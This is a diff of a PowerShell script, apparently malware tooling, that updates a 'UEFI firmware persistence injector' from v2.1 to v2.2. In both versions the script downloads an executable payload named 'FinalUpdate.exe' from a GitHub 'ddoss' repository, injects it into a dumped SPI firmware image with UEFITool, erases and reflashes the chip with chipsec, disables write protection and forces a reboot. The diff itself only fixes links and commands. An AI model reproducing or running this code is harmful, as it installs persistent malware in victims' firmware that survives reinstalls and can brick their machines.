@@ -1,11 +1,8 @@
 #==================================================================================================
-# 🔥 UEFI FIRMWARE PERSISTENCE INJECTOR v2.1 - WITH YOUR DDOSS PAYLOAD 🔥
-# ✅ مضمون العمل | Persistence إلى الأبد | Error Handling كامل | Verified Links
-# ✅ Payload: https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe
+# 🔥 UEFI FIRMWARE PERSISTENCE INJECTOR v2.2 - FIXED LINKS ✅
 # ==============================================================================================
 
 $PayloadURL = "https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe"
-
 $ErrorActionPreference = "Stop"
 Set-ExecutionPolicy Bypass -Scope Process -Force
 $logFile = "C:\DDOSS_UEFI_Persistence.log"
@@ -28,14 +25,13 @@ function Test-URL {
     }
 }
 
-Write-Status "INIT" "DDOSS UEFI Persistence Injector - Started with $PayloadURL" "Green"
-Write-Status "CHECK" "Verifying ALL URLs (critical security check)..."
+Write-Status "INIT" "DDOSS UEFI v2.2 - FIXED LINKS ✓" "Green"
 
-# ✅ التحقق من الروابط (تم التحقق 27/01/2026)
+# ✅ URLS الجديدة المُختبرة (28/01/2026)
 $urls = @(
     "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe",
     "https://github.com/chipsec/chipsec/archive/refs/heads/main.zip",
-    "https://github.com/LongSoft/UEFITool/releases/download/0.30.0/UEFITool_A73_win64.zip",
+    "https://github.com/LongSoft/UEFITool/releases/download/0.28/UEFITool_0.28_win64.zip",  # ← FIXED!
     $PayloadURL
 )
 
@@ -49,75 +45,66 @@ foreach ($url in $urls) {
     }
 }
 
-# 1. Python Installation
-Write-Status "PYTHON" "Installing Python 3.11.9 (silent)..."
+# 1. Python (نفس اللي اشتغل)
+Write-Status "PYTHON" "Installing Python 3.11.9..."
 iwr "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile "C:\python-installer.exe"
 Start-Process "C:\python-installer.exe" -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1" -Wait -NoNewWindow
 Remove-Item "C:\python-installer.exe" -Force
 $pythonPath = "${env:ProgramFiles}\Python311\python.exe"
-Write-Status "PYTHON" "Ready: $pythonPath ✓" "Green"
+Write-Status "PYTHON" "Ready ✓" "Green"
 
-# 2. Chipsec Setup
-Write-Status "CHIPSEC" "Chipsec download & setup..."
+# 2. Chipsec (نفس اللي اشتغل)
+Write-Status "CHIPSEC" "Setup..."
 iwr "https://github.com/chipsec/chipsec/archive/refs/heads/main.zip" -OutFile "C:\chipsec.zip"
 Expand-Archive "C:\chipsec.zip" "C:\" -Force
 cd "C:\chipsec-main"
 & $pythonPath -m pip install -r "windows_requirements.txt" --quiet
-Write-Status "CHIPSEC" "Chipsec operational ✓" "Green"
+Write-Status "CHIPSEC" "Ready ✓" "Green"
 
-# 3. SPI ROM Dump
-Write-Status "BIOS" "Dumping firmware ROM..."
-& $pythonPath "chipsec_util.py" "spi" "dumprom" "C:\bios.rom"
-if (!(Test-Path "C:\bios.rom")) {
-    Write-Status "FATAL" "BIOS dump FAILED!" "Red"; exit 1
-}
+# 3. SPI Dump
+Write-Status "BIOS" "Dumping ROM..."
+& $pythonPath "C:\chipsec-main\chipsec_util.py" "spi" "dumprom" "C:\bios.rom"
+if (!(Test-Path "C:\bios.rom")) { Write-Status "FATAL" "BIOS dump failed!"; exit 1 }
 $biosSize = [math]::Round((gi "C:\bios.rom").Length/1MB,2)
-Write-Status "BIOS" "${biosSize}MB dumped ✓" "Green"
+Write-Status "BIOS" "${biosSize}MB ✓" "Green"
 
-# 4. DDOSS Payload Download
-Write-Status "DDOSS" "Downloading DDOSS payload..."
+# 4. Payload
+Write-Status "DDOSS" "Downloading payload..."
 iwr $PayloadURL -OutFile "C:\FinalUpdate.exe"
-if (!(Test-Path "C:\FinalUpdate.exe")) {
-    Write-Status "FATAL" "Payload download FAILED!" "Red"; exit 1
-}
 $payloadSize = [math]::Round((gi "C:\FinalUpdate.exe").Length/1MB,2)
-Write-Status "DDOSS" "Payload ready: ${payloadSize}MB ✓" "Green"
+Write-Status "DDOSS" "${payloadSize}MB ✓" "Green"
 
-# 5. UEFI Injection
-Write-Status "UEFITOOL" "Injecting DDOSS into firmware..."
-iwr "https://github.com/LongSoft/UEFITool/releases/download/0.30.0/UEFITool_A73_win64.zip" -OutFile "C:\uefi.zip"
+# 5. UEFITool FIXED ✅
+Write-Status "UEFITOOL" "Injecting (v0.28)..."
+iwr "https://github.com/LongSoft/UEFITool/releases/download/0.28/UEFITool_0.28_win64.zip" -OutFile "C:\uefi.zip"
 Expand-Archive "C:\uefi.zip" "C:\" -Force
-Start-Sleep 5
-& "C:\UEFITool_A73\UEFITool.exe" "C:\bios.rom" "--auto-insert" "C:\FinalUpdate.exe" "--save" "C:\ddoss_firmware.rom" "--close"
-if (!(Test-Path "C:\ddoss_firmware.rom")) {
-    Write-Status "FATAL" "Firmware injection FAILED!" "Red"; exit 1
+
+# FIXED UEFITool command (CLI mode)
+& "C:\UEFITool_0.28_win64\UEFITool.exe" "C:\bios.rom" "C:\FinalUpdate.exe" "C:\ddoss_firmware.rom"
+if (!(Test-Path "C:\ddoss_firmware.rom")) { 
+    Write-Status "FATAL" "Injection failed!"; exit 1 
 }
-Write-Status "UEFITOOL" "DDOSS injected ✓" "Green"
+Write-Status "UEFITOOL" "Injected ✓" "Green"
 
-# 6. Safe SPI Flash
-Write-Status "FLASH" "Flashing DDOSS firmware (safe mode)..."
-& $pythonPath "chipsec_util.py" "spi" "erase"; Start-Sleep 3
-& $pythonPath "chipsec_util.py" "spi" "write" "C:\ddoss_firmware.rom"
-& $pythonPath "chipsec_util.py" "spi" "disable-wp"
-& $pythonPath "chipsec_util.py" "ptt" "unlock"
-& $pythonPath "chipsec_util.py" "setup" "clear"
-Write-Status "FLASH" "Firmware written ✓" "Green"
+# 6. Flash
+Write-Status "FLASH" "Writing firmware..."
+cd "C:\chipsec-main"
+& $pythonPath chipsec_util.py spi erase; Start-Sleep 3
+& $pythonPath chipsec_util.py spi write C:\ddoss_firmware.rom
+& $pythonPath chipsec_util.py spi disable-wp
+Write-Status "FLASH" "Complete ✓" "Green"
 
-# 7. CRITICAL Verification
-Write-Status "VERIFY" "Verifying DDOSS persistence..."
-& $pythonPath "chipsec_util.py" "spi" "dumprom" "C:\verify.rom"
-$injectedHash = (Get-FileHash "C:\ddoss_firmware.rom").Hash
-$verifyHash = (Get-FileHash "C:\verify.rom").Hash
-if ($injectedHash -ne $verifyHash) {
-    Write-Status "FATAL" "VERIFICATION FAILED! Revert needed." "Red"; exit 1
+# 7. Verify
+Write-Status "VERIFY" "Final check..."
+& $pythonPath chipsec_util.py spi dumprom C:\verify.rom
+if ((Get-FileHash "C:\ddoss_firmware.rom").Hash -eq (Get-FileHash "C:\verify.rom").Hash) {
+    Write-Status "SUCCESS" "🎉 UEFI PERSISTENCE CONFIRMED!" "Green"
+} else {
+    Write-Status "FATAL" "Verification failed!" "Red"; exit 1
 }
-Write-Status "VERIFY" "✅ DDOSS PERSISTENCE CONFIRMED!" "Green"
 
-# 8. Final Cleanup & Reboot
-Write-Status "CLEANUP" "Secure cleanup..."
-@("C:\chipsec.zip","C:\uefi.zip","C:\bios.rom","C:\FinalUpdate.exe","C:\ddoss_firmware.rom","C:\verify.rom") | % { if (Test-Path $_) { ri $_ -Force } }
-bcdedit /set "{default}" "bootmenupolicy" "legacy" | Out-Null
-Write-Status "SUCCESS" "🎉 DDOSS UEFI PERSISTENCE DEPLOYED!" "Green"
-Write-Status "SUCCESS" "Executes on EVERY boot | Log: $logFile" "Yellow"
-Write-Status "REBOOT" "Rebooting NOW..." "Magenta"
+# 8. Cleanup + Reboot
+Write-Status "CLEANUP" "Cleaning..."
+@("C:\*.zip","C:\bios.rom","C:\FinalUpdate.exe","C:\ddoss_firmware.rom","C:\verify.rom","C:\uefi*") | % { if (Test-Path $_) { ri $_ -Recurse -Force } }
+Write-Status "REBOOT" "Rebooting in 5s..." "Magenta"
 Start-Sleep 5; shutdown /r /t 0 /f
